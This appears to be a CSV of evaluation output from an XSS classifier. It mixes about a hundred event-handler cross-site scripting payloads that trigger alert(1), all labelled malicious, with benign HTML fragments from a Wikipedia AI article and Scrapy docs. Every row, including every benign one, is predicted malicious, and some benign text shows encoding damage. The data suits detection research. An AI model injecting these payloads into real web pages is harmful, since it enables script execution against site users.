payload,true_label,predicted_label,similarity_score,inference_time_ms
"<xmp draggable=""true"" ondrag=""alert(1)"">test</xmp>",1,1,4.1154,8.7251
	 </span>,0,1,6.0961,7.7129
"<li><a href=""/wiki/Heinz_von_Foerster"" title=""Heinz von Foerster"">Heinz von Foerster </a> </li>",0,1,3.1339,10.2907
	 </span> 2019 ,0,1,5.5996,5.9479
 </li>,0,1,5.4427,6.9877
"<html draggable=""true"" ondragend=""alert(1)"">test</html>",1,1,3.9933,7.9884
<aside id=x tabindex=1 onactivate=alert(1)></aside>,1,1,4.6891,8.8155
 </li>,0,1,5.4427,7.2434
"<li><a href=""/wiki/New_mysterianism"" title=""New mysterianism"">New mysterianism </a> </li>",0,1,3.576,9.7388
	 </span> 2014 ,0,1,6.1038,6.1711
	 </span>,0,1,6.0961,7.0353
	 </span></a></dt><dd>Learn how to contribute to the Scrapy project.</dd>,0,1,3.9106,10.3688
"<head onmousedown=""alert(1)"">test</head>",1,1,4.4135,9.2922
<span onpointerdown=alert(1)>XSS</span>,1,1,4.8135,8.9009
<table onpointerup=alert(1)>XSS</table>,1,1,4.9982,8.8866
<input3 onpointerover=alert(1)>XSS</input3>,1,1,4.6375,9.5134
"<h3><span class=""mw-headline"" id=""History_of_AI"">History of AI ",0,1,3.8496,9.8527
"<style>@keyframes x{}</style><address style=""animation-name:x"" onanimationend=""alert(1)""></address>",1,1,3.4643,14.6162
<aside onpointermove=alert(1)>XSS</aside>,1,1,4.5428,8.4222
"<ruby onmouseleave=""alert(1)"">test</ruby>",1,1,4.6186,8.118
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> See also <a rel=""nofollow"" class=""external text"" href=""http://consc.net/papers/facing.html"">this link </a> ",0,1,2.2282,19.5221
"<small onpaste=""alert(1)"" contenteditable>test</small>",1,1,4.3431,9.2439
"<object onkeypress=""alert(1)"" contenteditable>test</object>",1,1,4.1778,9.4996
"<li><a href=""#CITEREFBrooks1990"">Brooks 1990 </a> </li>",0,1,3.6103,10.2318
 </li>,0,1,5.4427,7.5084
<plaintext onfocusout=alert(1) tabindex=1 id=x></plaintext><input autofocus>,1,1,4.1109,9.153
"<li><a href=""/wiki/Computational_geometry"" title=""Computational geometry"">Computational geometry </a> </li> </ul>",0,1,3.2099,10.5298
<optgroup onpointerover=alert(1)>XSS</optgroup>,1,1,4.2178,9.8076
"<li id=""cite_note-Optimization_search-190""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Optimization_search_190-0"">^ </a> </b> ",0,1,3.1602,15.1575
"<dl onmouseover=""alert(1)"">test</dl>",1,1,4.5432,7.5005
"<dt><a class=""reference internal"" href=""topics/link-extractors.html""><span class=""doc"">Link Extractors",0,1,3.5393,9.3898
"<div draggable=""true"" contenteditable>drag me</div><meta ondragover=alert(1) contenteditable>drop here</meta>",1,1,3.4732,11.2178
"<style draggable=""true"" ondragleave=""alert(1)"">test</style>",1,1,4.081,10.1699
<svg><code onload=alert(1)></code>,1,1,4.9009,9.6031
<p onpointerout=alert(1)>XSS</p>,1,1,4.6359,9.1629
"<track onmouseout=""alert(1)"">test</track>",1,1,4.6504,9.9286
"<div onclick=""alert(1)"">test</div>",1,1,3.9349,8.5708
<slot id=x tabindex=1 ondeactivate=alert(1)></slot><input id=y autofocus>,1,1,3.9851,10.9097
DATASRC=#I DATAFLD=C DATAFORMATAS=HTML,1,1,4.2673,10.0383
"<style>@keyframes x{}</style><slot style=""animation-name:x"" onanimationstart=""alert(1)""></slot>",1,1,3.1926,11.9289
<menu id=x tabindex=1 onactivate=alert(1)></menu>,1,1,4.6313,7.6548
<tbody onpointermove=alert(1)>XSS</tbody>,1,1,4.0297,8.5078
<svg><menu onload=alert(1)></menu>,1,1,4.6088,7.5966
<ins onfocusout=alert(1) tabindex=1 id=x></ins><input autofocus>,1,1,4.2155,8.6036
<xmp id=x tabindex=1 onfocusin=alert(1)></xmp>,1,1,4.1521,8.8547
	 </span></a></dt><dd>Get answers to most frequently asked questions.</dd>,0,1,3.7072,10.0808
"	 </span> <span class=""reference-text"">Alex Graves, Santiago Fernandez, Faustino Gomez, and <a href=""/wiki/J%C3%BCrgen_Schmidhuber"" title=""J??¼rgen Schmidhuber"">J??¼rgen Schmidhuber </a> (2006). Connectionist temporal classification: Labelling unsegmented sequence data with recurrent neural nets. Proceedings of ICML'06, pp. 369??76. ",0,1,1.8056,22.9846
<svg><span onload=alert(1)></span>,1,1,4.8725,9.2945
<animate onpointerenter=alert(1)>XSS</animate>,1,1,4.5151,9.6926
	 </span></a></dt><dd>Understand Scrapy versioning and API stability.</dd>,0,1,4.1316,10.1088
"<dt><a class=""reference internal"" href=""topics/shell.html""><span class=""doc"">Scrapy shell",0,1,3.4942,10.7822
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,1,2.749,9.1977
	 </span> </a> </li>,0,1,5.3029,5.7781
<svg><title onload=alert(1)></title>,1,1,4.8703,6.6873
	 </span>,0,1,6.0961,5.5087
<figure onfocusout=alert(1) tabindex=1 id=x></figure><input autofocus>,1,1,4.1198,8.3828
"<div draggable=""true"" contenteditable>drag me</div><title ondragover=alert(1) contenteditable>drop here</title>",1,1,3.331,11.9081
<ul>,0,1,6.2585,5.9429
"<li id=""cite_note-scholarpedia-249""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-scholarpedia_249-0"">^ </a> </b> ",0,1,3.1338,13.6697
	 </span>,0,1,6.0961,7.866
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=22"" title=""Edit section: Embodied intelligence"">edit </a><span class=""mw-editsection-bracket"">] ",0,1,2.7011,18.0412
"<textarea onmouseenter=""alert(1)"">test</textarea>",1,1,4.6653,8.4884
<slot id=x tabindex=1 onfocusin=alert(1)></slot>,1,1,4.4852,10.5368
"<dl oncontextmenu=""alert(1)"">test</dl>",1,1,4.1408,10.3315
 </li>,0,1,5.4427,10.0828
"<section onbeforepaste=""alert(1)"" contenteditable>test</section>",1,1,3.8343,11.4897
"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.scientificamerican.com/article/can-neural-network-comput/"">""Can neural network computers learn from experience, and if so, could they ever become what we would call 'smart'?"" </a>. <i>Scientific American </i>. 2018<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">24 March ",0,1,2.1491,28.9666
"<dd>""Every aspect of learning or any other feature of intelligence can be so precisely described that a machine can be made to simulate it."" This conjecture was printed in the proposal for the Dartmouth Conference of 1956.<sup id=""cite_ref-Dartmouth_proposal_352-0"" class=""reference""><a href=""#cite_note-Dartmouth_proposal-352"">&#91;341&#93; </a> </sup> </dd> </dl>",0,1,1.8446,22.8582
"<tt oncopy=""alert(1)"" contenteditable>test</tt>",1,1,4.2058,10.5477
<tfoot id=x tabindex=1 onactivate=alert(1)></tfoot>,1,1,4.6214,10.07
"<select onmouseleave=""alert(1)"">test</select>",1,1,4.9091,7.5001
<output onpointermove=alert(1)>XSS</output>,1,1,4.5201,8.3992
"<li id=""cite_note-FOOTNOTENorvig2012-176""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTENorvig2012_176-0"">^ </a> </b> ",0,1,3.0231,15.4777
"<li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;448??49 </li> </ul>",0,1,2.8354,8.9388
"<li id=""cite_note-358""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-358"">^ </a> </b> ",0,1,3.2447,12.3631
"<svg ondblclick=""alert(1)"">test</svg>",1,1,4.6537,7.582
"<li><a href=""/wiki/Alexander_Lerner"" title=""Alexander Lerner"">Alexander Lerner </a> </li>",0,1,3.47,7.7096
"<style>:target {color: red;}</style><embed id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></embed>",1,1,2.9897,11.1583
"<div draggable=""true"" contenteditable>drag me</div><h1 ondrop=alert(1) contenteditable>drop here</h1>",1,1,3.3856,12.4684
<animatetransform onpointerenter=alert(1)>XSS</animatetransform>,1,1,4.0647,11.4235
"<hgroup draggable=""true"" ondragend=""alert(1)"">test</hgroup>",1,1,4.2871,11.0621
"<header onmousemove=""alert(1)"">test</header>",1,1,4.3282,8.8139
"<style>:target {color:red;}</style><option id=x style=""transition:color 1s"" ontransitionend=alert(1)></option>",1,1,3.1328,13.0699
"<li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;327??35, 434??35 </li>",0,1,2.8188,13.1861
<ol onpointerup=alert(1)>XSS</ol>,1,1,5.0101,9.5094
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,1,2.8984,11.151
"<li id=""cite_note-Revival_of_connectionism-172""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Revival_of_connectionism_172-0"">^ </a> </b> ",0,1,2.9934,14.4629
</div>,0,1,5.3448,6.1342
 </li>,0,1,5.4427,5.7617
"<ol oncopy=""alert(1)"" contenteditable>test</ol>",1,1,4.556,9.2063
"<li id=""cite_note-314""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-314"">^ </a> </b> ",0,1,3.1993,13.1436
"      <div class=""wy-side-scroll"">",0,1,4.9459,9.0764
"<video onmouseout=""alert(1)"">test</video>",1,1,5.1684,7.2167
<menu onpointerover=alert(1)>XSS</menu>,1,1,4.4489,6.2118
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/spiders.html"">Spiders</a></li>",0,1,3.5249,11.6419
"<li id=""cite_note-102""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-102"">^ </a> </b> ",0,1,3.2291,12.7966
"<div role=""navigation"" class=""navbox"" aria-labelledby=""Philosophy_of_science"" style=""padding:3px""><table class=""nowraplinks hlist mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"">",0,1,2.0344,19.8366
"<menuitem onmousedown=""alert(1)"">test</menuitem>",1,1,4.3064,9.6406
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><table id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></table>",1,1,2.5958,17.6515
"<b onbeforecut=""alert(1)"" contenteditable>test</b>",1,1,3.9134,6.5023
"<thead onkeypress=""alert(1)"" contenteditable>test</thead>",1,1,4.1252,9.6685
"<datalist draggable=""true"" ondrag=""alert(1)"">test</datalist>",1,1,4.2811,9.9055
"	 </span> <span class=""reference-text"">Hasim Sak and Andrew Senior and Francoise Beaufays (2014). Long Short-Term Memory recurrent neural network architectures for large scale acoustic modeling. Proceedings of Interspeech 2014. ",0,1,3.0249,14.9809
<multicol onpointermove=alert(1)>XSS</multicol>,1,1,4.4011,6.4445
<base onpointerdown=alert(1)>XSS</base>,1,1,4.5075,6.4629
"<li id=""cite_note-58""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-58"">^ </a> </b> ",0,1,3.2558,13.5741
<canvas onpointerover=alert(1)>XSS</canvas>,1,1,5.2977,8.0637
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,1,3.861,8.2801
"<li><a href=""/wiki/Automated_retail"" title=""Automated retail"">Retail </a> </li>",0,1,3.4526,8.8478
"<noframes draggable=""true"" ondragend=""alert(1)"">test</noframes>",1,1,3.78,9.0261
<menuitem onpointerover=alert(1)>XSS</menuitem>,1,1,4.2481,7.6327
"<b onbeforecopy=""alert(1)"" contenteditable>test</b>",1,1,3.8393,10.9236
"<meta onmouseenter=""alert(1)"">test</meta>",1,1,4.199,9.9952
"<style>:target {color:red;}</style><datalist id=x style=""transition:color 1s"" ontransitionend=alert(1)></datalist>",1,1,3.3471,11.7822
<animate onpointerleave=alert(1)>XSS</animate>,1,1,4.5891,9.1738
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,1,2.8984,12.0116
"<strike draggable=""true"" ondragstart=""alert(1)"">test</strike>",1,1,4.2465,10.5977
"<style>:target {color:red;}</style><bdi id=x style=""transition:color 1s"" ontransitionend=alert(1)></bdi>",1,1,3.2344,10.6527
 ,0,1,6.3657,5.7446
<q onpointerup=alert(1)>XSS</q>,1,1,4.7818,8.4182
 </li>,0,1,5.4427,5.4643
"<li><cite id=""CITEREFHenderson2007"" class=""citation news"">Henderson, Mark (24 April 2007). <a rel=""nofollow"" class=""external text"" href=""http://www.thetimes.co.uk/tto/technology/article1966391.ece"">""Human rights for robots? We're getting carried away"" </a>. <i>The Times Online </i>. London. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+Times+Online&amp;rft.atitle=Human+rights+for+robots%3F+We%27re+getting+carried+away&amp;rft.date=2007-04-24&amp;rft.aulast=Henderson&amp;rft.aufirst=Mark&amp;rft_id=http%3A%2F%2Fwww.thetimes.co.uk%2Ftto%2Ftechnology%2Farticle1966391.ece&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,1.4457,53.5918
"	 </span> <span class=""reference-text""><cite class=""citation journal"">M??¼ller, Vincent C.; Bostrom, Nick (2014). <a rel=""nofollow"" class=""external text"" href=""http://www.sophia.de/pdf/2014_PT-AI_polls.pdf"">""Future Progress in Artificial Intelligence: A Poll Among Experts"" </a> <span class=""cs1-format"">(PDF) ",0,1,1.9007,23.9365
"<blink oncontextmenu=""alert(1)"">test</blink>",1,1,4.4097,8.3147
    </nav>,0,1,5.4988,6.0699
"<basefont onmouseleave=""alert(1)"">test</basefont>",1,1,4.3636,8.7146
"<bgsound onmousedown=""alert(1)"">test</bgsound>",1,1,4.6622,9.2255
<frameset id=x tabindex=1 onbeforedeactivate=alert(1)></frameset><input autofocus>,1,1,3.7819,10.8102
"<h2><span class=""mw-headline"" id=""Tools"">Tools ",0,1,4.0542,9.4894
<colgroup onfocusout=alert(1) tabindex=1 id=x></colgroup><input autofocus>,1,1,3.9731,10.7061
<image src=validimage.png onloadstart=alert(1)>,1,1,4.2327,8.4133
"<style>:target {transform: rotate(180deg);}</style><title id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></title>",1,1,2.7628,11.9179
"<li><a href=""#CITEREFBBC_News2006""><i>BBC News </i> 2006 </a> </li> </ul>",0,1,3.0474,11.7656
<font id=x tabindex=1 onbeforedeactivate=alert(1)></font><input autofocus>,1,1,4.0865,11.6308
Uncertain reasoning:,0,1,6.5427,7.7151
"<div draggable=""true"" contenteditable>drag me</div><form ondragover=alert(1) contenteditable>drop here</form>",1,1,3.4648,10.0128
<sub onblur=alert(1) tabindex=1 id=x></sub><input autofocus>,1,1,3.9539,10.1555
" </tr><tr><th style=""padding:0.1em"">",0,1,4.1195,9.8835
<legend id=x tabindex=1 onactivate=alert(1)></legend>,1,1,4.8703,10.8887
"<ul><li><a href=""/wiki/Subjectivity"" title=""Subjectivity"">Polycontexturality </a> </li>",0,1,3.281,12.5566
"<u onbeforecopy=""alert(1)"" contenteditable>test</u>",1,1,3.8503,9.5854
"<rtc onkeydown=""alert(1)"" contenteditable>test</rtc>",1,1,4.0183,7.7929
<iframe onpointerup=alert(1)>XSS</iframe>,1,1,4.4461,8.3808
"<div draggable=""true"" contenteditable>drag me</div><q ondrop=alert(1) contenteditable>drop here</q>",1,1,3.521,11.1088
<data onblur=alert(1) tabindex=1 id=x></data><input autofocus>,1,1,3.9077,11.2415
"<li id=""cite_note-Configuration_space-129""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Configuration_space_129-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Configuration_space_129-1""><sup><i><b>b </b> </i> </sup> </a> ",0,1,2.3943,21.5309
"<table class=""box-More_citations_needed_section plainlinks metadata ambox ambox-content ambox-Refimprove"" role=""presentation""><tbody><tr><td class=""mbox-image"">",0,1,2.8283,9.2769
"	 </span> <span class=""reference-text""><a href=""#CITEREFRussellNorvig2009"">Russell &amp; Norvig 2009 </a>, p.&#160;2. ",0,1,2.936,12.8411
"<style>:target {transform: rotate(180deg);}</style><dd id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dd>",1,1,2.7131,12.9949
"<style>:target {color:red;}</style><html id=x style=""transition:color 1s"" ontransitionend=alert(1)></html>",1,1,3.3039,10.1646
"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.theguardian.com/technology/2016/feb/16/demis-hassabis-artificial-intelligence-deepmind-alphago"">""The superhero of artificial intelligence: can this genius keep it in check?"" </a>. <i>the Guardian </i>. 16 February 2016<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">26 April ",0,1,1.9913,25.5622
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=73"" title=""Edit section: AI textbooks"">edit </a><span class=""mw-editsection-bracket"">] ",0,1,2.7547,15.806
"<frameset onpaste=""alert(1)"" contenteditable>test</frameset>",1,1,4.3698,8.7799
"<tt onpaste=""alert(1)"" contenteditable>test</tt>",1,1,4.2975,8.1193
"<q onbeforepaste=""alert(1)"" contenteditable>test</q>",1,1,3.9202,9.6687
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;382??87 </li>",0,1,2.7699,12.6819
	 </span> ,0,1,6.0961,5.9929
<s onpointerenter=alert(1)>XSS</s>,1,1,4.4202,8.2754
"<li><a href=""/wiki/Understanding"" title=""Understanding"">Understanding </a> </li>",0,1,3.8164,10.3993
<blink id=x tabindex=1 onbeforeactivate=alert(1)></blink>,1,1,4.739,9.9432
<samp id=x tabindex=1 onbeforedeactivate=alert(1)></samp><input autofocus>,1,1,3.7696,11.2807
      <dl>,0,1,5.4343,6.0467
"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""http://www.sciencemag.org/news/2017/07/ai-revolution-science"">""The AI revolution in science"" </a>. <i>Science | AAAS </i>. 5 July 2017<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">7 May ",0,1,2.2293,23.1611
"<style>@keyframes slidein {}</style><div style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></div>",1,1,2.9406,12.9527
"<style>:target {color: red;}</style><p id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></p>",1,1,3.2237,11.0163
<slot onpointerenter=alert(1)>XSS</slot>,1,1,4.5602,7.0352
"	<a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=14"" title=""Edit section: Approaches"">edit </a><span class=""mw-editsection-bracket"">] ",0,1,2.679,9.4738
<footer id=x tabindex=1 onfocusin=alert(1)></footer>,1,1,4.2244,7.7743
"	 </span> <span class=""reference-text"">",0,1,4.7468,7.1699
"<style>@keyframes x{}</style><spacer style=""animation-name:x"" onanimationend=""alert(1)""></spacer>",1,1,3.3708,9.2642
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Algorithm"" title=""Algorithm"">Algorithms </a> </th><td class=""navbox-list navbox-even hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,1,2.0619,22.1773
"<header onmouseup=""alert(1)"">test</header>",1,1,4.2877,8.2727
 </li>,0,1,5.4427,7.5025
"<li><a href=""#CITEREFHowe1994"">Howe 1994 </a> </li> </ul>",0,1,3.2093,9.4108
"<div class=""div-col columns column-width"" style=""-moz-column-width: 20em; -webkit-column-width: 20em; column-width: 20em;"">",0,1,3.5589,12.3988
"		<div id=""jump-to-nav""> </div>",0,1,4.4126,8.7656
 </li>,0,1,5.4427,8.0333
"<time ondblclick=""alert(1)"">test</time>",1,1,5.0019,9.0789
"	 <div style=""padding:0em 0.25em"">",0,1,3.9663,9.1648
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,1,2.8984,11.2459
"	 <div class=""magnify""><a href=""/wiki/File:ParseTree.svg"" class=""internal"" title=""Enlarge""> </a> </div>A <a href=""/wiki/Parse_tree"" title=""Parse tree"">parse tree </a> represents the <a href=""/wiki/Syntax"" title=""Syntax"">syntactic </a> structure of a sentence according to some <a href=""/wiki/Formal_grammar"" title=""Formal grammar"">formal grammar </a>. </div> </div> </div>",0,1,2.079,19.3098
<img src=validimage.png onloadend=alert(1)>,1,1,4.0143,7.5383
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Natural_language_processing"" title=""Natural language processing"">Natural language processing </a> </div>",0,1,2.5717,14.0161
"<div onpaste=""alert(1)"" contenteditable>test</div>",1,1,4.1388,8.3377
"<hr onmouseup=""alert(1)"">test</hr>",1,1,4.806,8.8056
<legend onpointerleave=alert(1)>XSS</legend>,1,1,4.8402,10.0623
"<strike onmousemove=""alert(1)"">test</strike>",1,1,4.7092,8.4077
"<ul><li><a href=""/wiki/Internet_of_things"" title=""Internet of things"">Internet of things </a> </li> </ul> </li>",0,1,3.664,13.5929
"<basefont onbeforecopy=""alert(1)"" contenteditable>test</basefont>",1,1,3.9042,8.6696
"<dt><a class=""reference internal"" href=""topics/leaks.html""><span class=""doc"">Debugging memory leaks",0,1,3.5012,11.0019
<body onwheel=alert(1)>,1,1,5.6458,6.5621
"<nav onbeforecut=""alert(1)"" contenteditable>test</nav>",1,1,3.9163,8.1092
"          <a href=""#"">Scrapy</a>",0,1,5.0903,7.0325
"              <div class=""version"">",0,1,5.1391,7.0047
"<header onkeypress=""alert(1)"" contenteditable>test</header>",1,1,4.27,8.092
"<h3><span class=""mw-headline"" id=""Other_sources"">Other sources ",0,1,4.0851,8.9173
"<frameset draggable=""true"" ondragenter=""alert(1)"">test</frameset>",1,1,4.032,9.9987
	 </span> 2020 ,0,1,5.8588,8.7109
"<style>:target {color:red;}</style><embed id=x style=""transition:color 1s"" ontransitionend=alert(1)></embed>",1,1,3.1047,12.2284
"<li><a href=""/wiki/Second-order_cybernetics"" title=""Second-order cybernetics"">Second-order cybernetics </a> </li>",0,1,3.0496,8.183
	 </span> </h3>,0,1,5.8087,6.5558
<b id=x tabindex=1 onactivate=alert(1)></b>,1,1,4.832,8.1794
"      <div class=""wy-nav-content"">",0,1,4.3012,8.7021
<del onpointerup=alert(1)>XSS</del>,1,1,5.0944,8.102
"<strong oncontextmenu=""alert(1)"">test</strong>",1,1,4.4087,8.2015
"<li><a href=""/wiki/Machine_Intelligence_Research_Institute"" title=""Machine Intelligence Research Institute"">Machine Intelligence Research Institute </a> </li>",0,1,2.8766,8.0322
"<dl class=""docutils"">",0,1,4.7949,8.3659
<figure id=x tabindex=1 onbeforedeactivate=alert(1)></figure><input autofocus>,1,1,3.9315,10.9522
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,1,2.8984,12.5628
"<ul><li><a href=""/wiki/Concurrent_computing"" title=""Concurrent computing"">Concurrent computing </a> </li>",0,1,3.3159,11.2715
"	 <div style=""padding:0em 0.25em"">",0,1,3.9663,7.6379
"<li id=""cite_note-HintonDengYu2012-248""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-HintonDengYu2012_248-0"">^ </a> </b> ",0,1,2.9028,14.8228
"<li id=""cite_note-261""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-261"">^ </a> </b> ",0,1,3.2305,13.8648
"<noscript onmousedown=""alert(1)"">test</noscript>",1,1,4.4836,9.537
"<main onbeforepaste=""alert(1)"" contenteditable>test</main>",1,1,3.6885,8.8559
<nextid id=x tabindex=1 ondeactivate=alert(1)></nextid><input id=y autofocus>,1,1,3.8611,9.1875
"<head draggable=""true"" ondragstart=""alert(1)"">test</head>",1,1,4.0069,8.517
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=4"" title=""Edit section: Challenges"">edit </a><span class=""mw-editsection-bracket"">] ",0,1,2.6936,13.7176
"	 </span>. <i>Science </i>. <b>291 </b> (5504): 599??00. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1126%2Fscience.291.5504.599"">10.1126/science.291.5504.599 </a>. <a href=""/wiki/PubMed_Identifier"" class=""mw-redirect"" title=""PubMed Identifier"">PMID </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/11229402"">11229402 </a> &#8211; via msu.edu. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Science&amp;rft.atitle=Autonomous+mental+development+by+robots+and+animals&amp;rft.volume=291&amp;rft.issue=5504&amp;rft.pages=599-600&amp;rft.date=2001&amp;rft_id=info%3Adoi%2F10.1126%2Fscience.291.5504.599&amp;rft_id=info%3Apmid%2F11229402&amp;rft.aulast=Weng&amp;rft.aufirst=J.&amp;rft.au=McClelland&amp;rft.au=Pentland%2C+A.&amp;rft.au=Sporns%2C+O.&amp;rft.au=Stockman%2C+I.&amp;rft.au=Sur%2C+M.&amp;rft.au=Thelen%2C+E.&amp;rft_id=http%3A%2F%2Fwww.cse.msu.edu%2Fdl%2FSciencePaper.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,1.4702,93.1973
"<li><a href=""/wiki/Artificial_life"" title=""Artificial life"">Artificial life </a> </li>",0,1,3.6518,9.082
"<style>@keyframes slidein {}</style><strong style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></strong>",1,1,2.9901,15.5591
<s onblur=alert(1) tabindex=1 id=x></s><input autofocus>,1,1,4.0274,7.2497
"<base onkeypress=""alert(1)"" contenteditable>test</base>",1,1,4.1432,6.2504
	 </span>,0,1,6.0961,5.8881
"<article onmouseout=""alert(1)"">test</article>",1,1,4.3938,6.2702
<noframes onpointerover=alert(1)>XSS</noframes>,1,1,4.4352,6.5527
"<blink onbeforecopy=""alert(1)"" contenteditable>test</blink>",1,1,4.081,8.03
"  <ul class=""wy-breadcrumbs"">",0,1,5.3123,6.6435
"	 </span></a></dt><dd>Quickly export your scraped items to a file (XML, CSV, etc).</dd>",0,1,3.4359,7.679
"<li><a href=""/wiki/Citizen_science#Plastics_and_pollution"" title=""Citizen science"">Citizen Science </a> </li>",0,1,3.3684,7.918
<animatemotion onpointerdown=alert(1)>XSS</animatemotion>,1,1,4.1647,9.7857
"<blink draggable=""true"" ondrag=""alert(1)"">test</blink>",1,1,4.4081,8.4058
<tt id=x tabindex=1 ondeactivate=alert(1)></tt><input id=y autofocus>,1,1,3.8204,8.8519
"<colgroup onmouseenter=""alert(1)"">test</colgroup>",1,1,4.4679,8.0977
<i onfocusout=alert(1) tabindex=1 id=x></i><input autofocus>,1,1,4.1961,8.4338
"<style>@keyframes x{}</style><canvas style=""animation-name:x"" onanimationstart=""alert(1)""></canvas>",1,1,3.4265,11.2135
<b onpointerover=alert(1)>XSS</b>,1,1,4.634,9.1268
"<big onmouseout=""alert(1)"">test</big>",1,1,4.8674,8.9704
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,1,2.749,13.569
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,1,2.8984,11.8273
"	 <div> </div> </td> </tr><tr><td class=""navbox-abovebelow"" colspan=""2"">",0,1,3.5295,10.9455
